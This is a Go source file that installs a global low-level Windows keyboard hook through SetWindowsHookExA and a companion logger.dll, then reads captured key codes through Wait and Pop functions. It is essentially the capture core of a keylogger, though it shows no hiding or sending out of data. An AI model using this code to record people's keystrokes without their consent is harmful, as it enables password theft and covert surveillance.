package logger

import (
    "golang.org/x/sys/windows"
    "fmt"
    "syscall"
)

type winLogger struct {
    // DLL and procedures used to manipulate hooks
    u32Dll *windows.LazyDLL
    setHook *windows.LazyProc
    clearHook *windows.LazyProc
    // DLL and procedures used to log keys
    klDll *windows.LazyDLL
    keyCallback *windows.LazyProc
    pop *windows.LazyProc
    wait *windows.LazyProc
    // Hook returned by SetWindowsHookEx
    hook1 uintptr
    hook2 uintptr
    // Signals that the structure loaded successfully
    done bool
}

// Window handle for low level keyboard hooks
const wh_KEYBOARD_LL uintptr = 13

func GetLogger() (Logger, error) {
    return &winLogger{}, nil
}

func (wl *winLogger) Setup() error {
    var err error

    // Loads User32.dll, so we may access 'SetWindowsHookEx' and 'UnhookWindowsHookEx'
    wl.u32Dll = windows.NewLazySystemDLL("User32.dll")
    if err != nil {
        return err
    }
    err = wl.u32Dll.Load()
    if err != nil {
        return err
    }

    // Loads logger.dll, so we may access the logging functions
    wl.klDll = windows.NewLazyDLL("logger.dll")
    if err != nil {
        return err
    }
    err = wl.klDll.Load()
    if err != nil {
        return err
    }

    // Loads the logging functions
    wl.keyCallback = wl.klDll.NewProc("keyCallback")
    err = wl.keyCallback.Find()
    if err != nil {
        return err
    }

    wl.pop = wl.klDll.NewProc("pop")
    err = wl.pop.Find()
    if err != nil {
        return err
    }

    wl.wait = wl.klDll.NewProc("wait")
    err = wl.wait.Find()
    if err != nil {
        return err
    }

    // Loads functons to manipulate hooks
    wl.setHook = wl.u32Dll.NewProc("SetWindowsHookExA")
    err = wl.setHook.Find()
    if err != nil {
        return err
    }

    wl.clearHook = wl.u32Dll.NewProc("UnhookWindowsHookEx")
    err = wl.clearHook.Find()
    if err != nil {
        return err
    }

    // Set the hook
    wl.hook1, wl.hook2, err = wl.setHook.Call(wh_KEYBOARD_LL, wl.keyCallback.Addr(),
        wl.klDll.Handle(), 0)
    if err != nil {
        werr := err.(syscall.Errno)
        if werr != 0 {
            return err
        }
    }

    wl.done = true
    return nil
}

func (wl *winLogger) Clean() {
    if wl.done {
        _, _, err := wl.clearHook.Call(wl.hook1, wl.hook2)
        werr := err.(syscall.Errno)
        if werr == 0 {
            err = nil
        }
        fmt.Printf("Error clearing hook: %+v\n", err)
    }

    if wl.klDll != nil {
        windows.FreeLibrary(windows.Handle(wl.klDll.Handle()))
        wl.klDll = nil
    }

    if wl.u32Dll != nil {
        windows.FreeLibrary(windows.Handle(wl.u32Dll.Handle()))
        wl.u32Dll = nil
    }
}

func (wl *winLogger) Wait() error {
    _, _, err := wl.wait.Call()
    werr := err.(syscall.Errno)
    if werr == 0 {
        err = nil
    }
    return err
}

func (wl *winLogger) Pop() (uint16, error) {
    r1, _, err := wl.pop.Call()
    werr := err.(syscall.Errno)
    if werr == 0 {
        err = nil
    }
    return uint16(r1 & 0xFFFF), err
}
